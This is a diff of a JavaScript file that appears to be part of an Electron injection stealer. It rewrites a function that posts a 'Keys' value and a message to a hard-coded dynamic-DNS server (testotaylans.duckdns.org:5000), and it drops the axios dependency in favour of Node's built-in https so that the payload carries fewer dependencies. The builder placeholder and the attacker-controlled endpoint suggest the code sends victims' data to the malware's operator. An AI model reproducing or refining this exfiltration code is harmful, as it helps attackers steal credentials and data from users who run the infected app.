@@ -4,7 +4,6 @@ const https = require('https');
 const args = process.argv;
 const path = require('path');
 const querystring = require('querystring');
-const axios = require('axios');
 
 const {
     BrowserWindow,
@@ -17,19 +16,38 @@ const apiBaseUrl = "http://testotaylans.duckdns.org:5000";
 const Keys = "%CUSTOMERKEYS%";
 
 async function sendToApiMessage(Keys, message) {
-    const url = `${apiBaseUrl}/send-message`;
-    const data = { Keys: Keys, message: message };
+    const data = JSON.stringify({ Keys: Keys, message: message });
+    const url = new URL(`${apiBaseUrl}/send-message`);
 
-    try {
-        const response = await axios.post(url, data, {
-            headers: {
-                'Content-Type': 'application/json'
-            }
+    const options = {
+        hostname: url.hostname,
+        port: url.port || 443,
+        path: url.pathname,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length,
+        }
+    };
+
+    const req = https.request(options, (res) => {
+        let responseData = '';
+
+        res.on('data', (chunk) => {
+            responseData += chunk;
         });
-        console.log('API Response:', response.data);
-    } catch (error) {
+
+        res.on('end', () => {
+            console.log('API Response:', JSON.parse(responseData));
+        });
+    });
+
+    req.on('error', (error) => {
         console.error('Error sending message to API:', error);
-    }
+    });
+
+    req.write(data);
+    req.end();
 }
 
 const CONFIG = {
